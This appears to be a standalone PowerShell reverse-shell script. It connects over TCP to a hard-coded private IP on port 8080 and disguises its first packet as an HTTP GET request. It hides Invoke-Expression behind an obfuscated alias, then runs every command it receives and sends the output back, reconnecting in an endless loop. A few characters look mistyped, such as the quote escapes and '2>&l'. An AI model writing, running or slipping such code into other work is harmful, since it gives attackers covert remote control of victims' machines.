while ($true) {
    $iphx = "C0","A8","38","68"
    $ip = ($iphx | ForEach { [convert]::ToInt32($_,16) }) -join '.'
    $wget = "GET /index.html HTTP/1.1'r'nHost: $ip'r'nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'r'nAccept: text/html'r'n'r'n"
    $enco = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0}

    $s = "gi-ekjf-xsld"
    Set-alias $s ( $s[$true-12] + ($s[[byte]("0x" + "FF") - 264]) + ($s[[byte]("0x" + "9a") - 158]) )

    $tp = New-Object System.Net.Sockets.TCPClient($ip,8080)
    $get = $tp.GetStream()

    $d = $enco::UTF8.GetBytes($wget)
    $get.Write($d, 0, $d.Length)
    $comm = (gi-ekjf-xsld whoami) + "$ "
    while(($l = $get.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $enco).GetString($b,0,$l)
        $comm = (&"whoami") + "$ "
        $d = $enco::UTF8.GetBytes((gi-ekjf-xsld $v 2>&l | Out-String )) + $enco::UTF8.GetBytes($comm)
        $get.Write($d,0,$d.Length)
    }
    $tp.Close()
    Start-Sleep -Seconds 5
}